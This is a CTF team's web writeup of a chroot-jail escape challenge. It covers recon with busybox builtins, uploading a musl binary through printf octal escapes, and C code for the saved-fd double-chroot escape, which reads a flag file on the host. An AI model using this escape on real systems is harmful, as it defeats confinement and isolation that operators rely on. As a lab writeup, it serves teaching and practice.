@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>chroot-silver · Kaspersky CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="`SOCAT_PPID=1` gives it away: the jailer lives outside the jail. Build a musl PIE, upload it with all-3-digit octal `printf`, run via the musl loader, and escape through a saved root fd." />
+<link rel="icon" href="../images/Logo-nobg.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=2" />
+<link rel="stylesheet" href="../css/styles.css?v=16" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<div class="backdrop" aria-hidden="true"></div>
+<div class="gutters" aria-hidden="true"></div>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <span class="nav-ws">[0]</span>
+      <a href="../index.html#top" class="brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#focus">categories</a>
+      <a href="../index.html#results">results</a>
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">challenge</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <span class="nav-clock" id="navClock" aria-hidden="true">00:00:00</span>
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../index.html#about">about</a>
+    <a href="../index.html#focus">categories</a>
+    <a href="../index.html#results">results</a>
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">challenge</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<main class="wu-main container" id="top">
+  <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>chroot-silver</span></div>
+
+  <header class="wu-head">
+    <div class="wu-head-tags">
+      <span class="wu-cat wu-cat-misc">misc</span>
+      <span class="wu-pts">64 pts</span>
+      <span class="wu-when">solved Aug 30, 03:14</span>
+    </div>
+    <h1>chroot-silver <span>sandbox escape</span></h1>
+    <div class="wu-flagrow">
+      <span class="wu-flagrow-k">flag</span>
+      <code id="wuFlag">kaspersky{a9f61e72-504f-4d36-8094-be8147e05f42}</code>
+      <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+    </div>
+  </header>
+
+  <div class="wu-layout">
+    <article class="wu-article">
+<h2 id="challenge"><a class="wu-anchor" href="#challenge" aria-hidden="true">#</a>Challenge</h2>
+<pre><code>- Are you selling?
+- No, only showing.
+- Beautiful.
+
+openssl s_client \
+  -connect .tcp.kit.sasc.tf:443 \
+  -servername .tcp.kit.sasc.tf \
+  -quiet
+
+tcp://&lt;hash&gt;.tcp.kit.sasc.tf:443
+</code></pre>
+<p>Connecting drops you into a bare shell - a <code>chroot</code> jail. The objective is to
+break out of the chroot and read the flag, which lives on the <em>real</em> filesystem
+outside the jail.</p>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p>The jail contains only:</p>
+<ul>
+<li><code>/bin/sh</code>, busybox <code>ash</code> (env shows <code>BB_ASH_VERSION=&#39;1.37.0&#39;</code>)</li>
+<li><code>/lib/ld-musl-x86_64.so.1</code> and <code>/lib/libc.musl-x86_64.so.1</code>, <strong>musl</strong>, not glibc</li>
+</ul>
+<p>No <code>ls</code>, <code>cat</code>, <code>id</code>, <code>mkdir</code>, <code>chroot</code>, <code>base64</code>, <code>curl</code>, <code>wget</code>, <code>xxd</code>,
+<code>head</code>, <code>grep</code>, <code>find</code>. No <code>/proc</code>, <code>/dev</code>, <code>/tmp</code>, <code>/etc</code>, <code>/home</code>, <code>/root</code>,
+<code>/usr</code>. <code>PATH=/bin:/sbin:/usr/bin:/usr/sbin</code> but those dirs are empty except
+<code>/bin/sh</code>.</p>
+<p>Useful facts gathered with shell builtins:</p>
+<pre><code>$ echo /*                -&gt; /bin /lib
+$ set                    -&gt; BB_ASH_VERSION=1.37.0, SOCAT_PID=545, SOCAT_PPID=1
+$ echo /lib/*            -&gt; /lib/ld-musl-x86_64.so.1 /lib/libc.musl-x86_64.so.1
+</code></pre>
+<p><code>SOCAT_PPID=1</code> is the key hint: the shell is spawned by <strong>socat</strong>, and socat is a
+direct child of PID 1 - socat runs <strong>outside</strong> the chroot, holding a reference to
+the real filesystem. The <code>/</code> and <code>/bin</code> directories are writable, which lets us
+write an escape binary into the jail.</p>
+<h2 id="connection"><a class="wu-anchor" href="#connection" aria-hidden="true">#</a>Connection</h2>
+<p>The provided <code>openssl s_client</code> snippet does not work well with piped stdin
+(silent drops, HTTP 400 from the TLS frontend, resets). A Python <code>socket + ssl</code>
+client with <code>server_hostname = &lt;instance-hostname&gt;</code> is reliable. See the skill
+reference for the full client; the essentials:</p>
+<pre><code class="language-python">ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+s = ctx.wrap_socket(socket.socket(), server_hostname=host)
+s.connect((host, 443))
+</code></pre>
+<h2 id="building-the-escape-binary-musl-pie"><a class="wu-anchor" href="#building-the-escape-binary-musl-pie" aria-hidden="true">#</a>Building the escape binary (musl PIE)</h2>
+<p>The jail uses musl, so the binary must be musl-linked. The local box had no
+<code>musl-gcc</code>, so I compiled inside an alpine container (plain <code>gcc</code> in alpine
+already targets musl):</p>
+<pre><code class="language-bash">docker run --rm -v &quot;$PWD&quot;:/work alpine:latest sh -c \
+  &#39;apk add --no-cache gcc musl-dev; gcc -Os -s -o /work/escape-pie /work/escape.c&#39;
+</code></pre>
+<p>Two constraints force a specific binary shape:</p>
+<ol>
+<li><strong>No exec bit.</strong> Files created by shell redirect have no <code>+x</code>, and there is no
+<code>chmod</code>. Direct execution → <code>Permission denied</code>. Solution: run via the
+existing loader <code>/lib/ld-musl-x86_64.so.1 &lt;binary&gt;</code>, which does not require
+the exec bit.</li>
+<li><strong>musl loader accepts only PIE.</strong> The loader rejects ET_EXEC (<code>-static</code> or
+<code>-no-pie</code>) with <code>Not a valid dynamic program</code>. So build a plain dynamic PIE
+(<code>gcc -Os -s</code>, default on alpine) and let it link against the jail&#39;s own
+<code>/lib/libc.musl-x86_64.so.1</code>.</li>
+</ol>
+<h2 id="upload-via-printf-b-and-the-bug-that-cost-20-minutes"><a class="wu-anchor" href="#upload-via-printf-b-and-the-bug-that-cost-20-minutes" aria-hidden="true">#</a>Upload via <code>printf %b</code> (and the bug that cost 20 minutes)</h2>
+<p>No network tools, so upload the binary with the <code>printf</code> builtin, encoding bytes
+as octal escapes. The <strong>first attempt silently corrupted the binary</strong>, producing
+<code>unsupported relocation type 64</code> and segfaults that looked like a loader
+mismatch but were actually broken bytes.</p>
+<p>Root cause: <strong>busybox <code>printf %b</code> parses octal escapes greedily (variable
+length).</strong> A NUL encoded as <code>\000</code> followed by a literal octal digit (<code>0</code> to <code>7</code>) merges:
+<code>\0000</code> → <code>0x00</code>, <code>\0001</code> → <code>0x01</code>. Every byte value where a <code>\0xx</code> escape is
+followed by an octal digit lost/shifted a byte - ~0.6% of a 14 KB binary.
+(Also: <code>%</code> is <em>literal</em> under <code>%b</code>, so the old habit of escaping <code>%</code> as <code>%%</code>
+would emit two bytes.)</p>
+<p><strong>Fix - encode <em>every</em> byte as a 3-digit octal escape</strong>, so each byte is
+backslash-delimited and the greedy parser can&#39;t bleed forward:</p>
+<pre><code class="language-python">def encode_bytes(data: bytes) -&gt; str:
+    return &quot;&quot;.join(f&quot;\\{b:03o}&quot; for b in data)
+</code></pre>
+<p>Verified byte-for-byte round-trip against a 0..255 sweep in an alpine container
+(<code>cmp</code> clean) before touching a real binary.</p>
+<h2 id="the-escape-two-chroot-fd-method"><a class="wu-anchor" href="#the-escape-two-chroot-fd-method" aria-hidden="true">#</a>The escape (two-chroot / fd method)</h2>
+<pre><code class="language-c">mkdir(&quot;/x&quot;, 0755);
+int fd = open(&quot;/&quot;, O_RDONLY | O_DIRECTORY);  // fd to jail root BEFORE chroot
+chroot(&quot;/x&quot;);                                 // confine to a subdir
+fchdir(fd);                                   // cwd = OLD root via saved fd
+close(fd);
+for (int i = 0; i &lt; 1024; i++) chdir(&quot;..&quot;);   // walk up to the real root
+chroot(&quot;.&quot;);                                  // re-chroot to the real root
+chdir(&quot;/&quot;);
+</code></pre>
+<p>Because we captured an fd to the jail root <em>before</em> chrooting, and
+<code>fchdir(fd)</code> restores a cwd outside the new chroot, walking <code>..</code> climbs out of
+the jail entirely. The final <code>chroot(&quot;.&quot;)</code> re-roots us onto the real filesystem.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<p>Rather than guessing <code>/flag</code>, the escape binary recurses the real root
+(skipping <code>/proc</code>, <code>/sys</code>, <code>/dev</code>, <code>/usr</code>, <code>/lib*</code>, <code>/bin</code>, <code>/sbin</code>) and prints
+any file containing <code>kaspersky{</code>:</p>
+<pre><code>[proc/1/cmdline] socat
+[hostname] localhost
+
+[HIT] /root/flag.txt (48 bytes):
+kaspersky{a9f61e72-504f-4d36-8094-be8147e05f42}
+</code></pre>
+<p><code>/proc/1/cmdline</code> = <code>socat</code> confirms the frontend that was outside the jail.</p>
+<h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
+<ul>
+<li><code>SOCAT_PPID=1</code> (or any <code>*_PPID=1</code> env) → the jail&#39;s parent lives outside it.</li>
+<li>musl jails: build PIE musl binaries, run via <code>/lib/ld-musl-x86_64.so.1</code>.</li>
+<li><code>printf %b</code> octal escapes are greedy in busybox - all-octal 3-digit encoding
+or you silently corrupt the upload.</li>
+<li>The flag is per-instance; re-leak on every fresh spawn, and search by content
+instead of guessing paths.</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#challenge">Challenge</a></li><li><a href="#recon">Recon</a></li><li><a href="#connection">Connection</a></li><li><a href="#building-the-escape-binary-musl-pie">Building the escape binary (musl PIE)</a></li><li><a href="#upload-via-printf-b-and-the-bug-that-cost-20-minutes">Upload via printf %b (and the bug that cost 20 minutes)</a></li><li><a href="#the-escape-two-chroot-fd-method">The escape (two-chroot / fd method)</a></li><li><a href="#flag">Flag</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="awasmsafe.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">awasmsafe</span></a>
+    <a class="wu-pager-link wu-pager-next" href="sudokrypt.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Sudokrypt</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Navigate</h4>
+      <a href="../index.html#about">About</a>
+      <a href="../index.html#focus">Categories</a>
+      <a href="../index.html#results">Results</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../index.html#join">Join</a>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=16"></script>
+</body>
+</html>
